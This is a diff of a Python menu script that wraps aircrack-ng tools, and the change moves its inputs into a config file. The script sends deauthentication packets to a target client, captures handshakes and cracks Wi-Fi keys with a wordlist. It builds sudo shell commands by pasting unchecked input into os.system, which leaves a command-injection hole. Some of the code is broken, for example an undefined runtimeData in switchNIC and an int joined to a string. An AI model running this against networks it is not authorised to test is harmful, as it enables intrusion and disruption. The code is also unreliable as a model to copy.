@@ -1,39 +1,38 @@
 #!/bin/python
 import sys
 import os
+import configparser
 
-# This class contains state data used throughout the program
-# This may need to move to its own file if it gets too large
-class RuntimeData:
-  def __init__(self, userNic, userChannel):
-    self.userNic = userNic
-    self.userChannel = userChannel
+# Store user configuration
+config = configparser.ConfigParser()
 
 # Main script starts here
 def main():
 	# Check passed args
-	if len(sys.argv) < 2:
-		print("error: No wireless interface provided\n")
+	if len(sys.argv) < 1:
+		print("error: No configuration file provided\n")
 		usage()
 		sys.exit(1)
 
-	#TODO: Verify NIC actually exists before accepting
-	userChannel = 1
+	# Open Config file
+	configPath = None
 	if len(sys.argv) > 2:
-		userChannel = sys.argv[2]
+		configPath = sys.argv[2]
+	else:
+	    configPath = sys.argv[1]
+	config.read(configPath)
 
 	# Initialize loop
-	runtimeData = RuntimeData(sys.argv[1], userChannel)
-	print("Using channel " + str(runtimeData.userChannel) + " on " + runtimeData.userNic + "\n")
-	inputLoop(runtimeData)
+	print("Using channel " + config['host']['channel'] + " on " + config['host']['nic'] + "\n")
+	inputLoop()
 
 def usage():
 	if sys.platform == "win32":
-		print("usage: python " + __file__ + " <device name> [channel]\n")
+		print("usage: python " + __file__ + "<C:\path\to\config>\n")
 	else:
-		print("usage: ./" + __file__ + " <device name> [channel]\n")
+		print("usage: ./" + __file__ + " </path/to/config\n")
 
-def inputLoop(runtimeData):
+def inputLoop():
 	command = "-1"
 	menu()
 	while command == "-1":
@@ -41,26 +40,26 @@ def inputLoop(runtimeData):
 		
 		if command == "1":
 			#Fire aireplay-ng
-			deauth(runtimeData)
+			deauth()
 			command = "-1"
 		elif command == "2":
 			#Fire airmon-ng
-			setPromisc(runtimeData)
+			setPromisc()
 			command = "-1"
 		elif command == "3":
 			#Fire airodump-ng
-			capture(runtimeData)
+			capture()
 			command = "-1"
 		elif command == "4":
 			#Fire aircrack-ng
-			crack(runtimeData)
+			crack()
 			command = "-1"
 		elif command == "5":
 			#Fire airmon-ng
-			listDevices(runtimeData)
+			listDevices()
 			command = "-1"
 		elif command == "6":
-			switchNIC(runtimeData)
+			switchNIC()
 			command = "-1"
 		elif command == "?":
 			usage()
@@ -82,22 +81,22 @@ def menu():
 	print("?  Usage")
 	print("Enter one of the above commands:")
 
-def deauth(runtimeData):
+def deauth():
 	#Aireplay command to send deauth packets
-	bssid = input("Specify the BSSID of the wireless AP: ")
-	target_mac = input("Specify the MAC address of the client you wish to deauthenticate: ")
-	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + runtimeData.userNic
+	bssid = config['ap']['bssid']
+	target_mac = config['target']['mac']
+	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + config['host']['nic']
 	os.system(cmd)
 	
-def setPromisc(runtimeData):
+def setPromisc():
 	#Airmon command to set nic to promiscous
 	if sys.platform == "win32":
 		cmd = "idk how to escalate permissions in windows"
 	else:
-		cmd = "sudo airmon-ng start " + runtimeData.userNic
+		cmd = "sudo airmon-ng start " +  config['host']['nic']
 	os.system(cmd)
 
-def listDevices(runtimeData):
+def listDevices():
 	#Airmon command to list devices'
 	if sys.platform == "win32":
 		cmd = "idk how to escalate permissions in windows"
@@ -106,26 +105,26 @@ def listDevices(runtimeData):
 
 	os.system(cmd)
 
-def switchNIC(runtimeData):
+def switchNIC():
 	newNic = input("Enter NIC device name: ")
 	if sys.platform == "win32":
 		cmd = "idk how to escalate permissions in windows"
 	else:
-		cmd = "sudo airmon-ng stop " + runtimeData.userNic
+		cmd = "sudo airmon-ng stop " + config['host']['nic']
 	runtimeData.userNic = command
 	os.system(cmd)
 	
-def capture(runtimeData):
+def capture():
 	#Airodump command to capture authentication traffic
-	bssid = input("Please specify a BSSID: ")
+	bssid = config['ap']['bssid']
 	cap_file = input("Please specify a capture file to save to: ")
-	cmd = "sudo airodump-ng -c " + runtimeData.userChannel + " --bssid " + bssid + " -w " + cap_file + " " + runtimeData.userNic
+	cmd = "sudo airodump-ng -c " + int(config['host']['channel']) + " --bssid " + bssid + " -w " + cap_file + " " + config['host']['nic']
 	os.system(cmd)
 	
-def crack(runtimeData):
+def crack():
 	#Aircrack command to crack the key in the traffic dump
-	word_list = input("Please specify a wordlist file: ")
-	bssid = input("Please specify a BSSID: ")
+	word_list = config['host']['wordlist']
+	bssid = config['ap']['bssid']
 	cap_file = input("Please specify a capture file: ")
 	cmd = "sudo aircrack-ng -w " + word_list + " -b " + bssid + " " + cap_file
 	os.system(cmd)
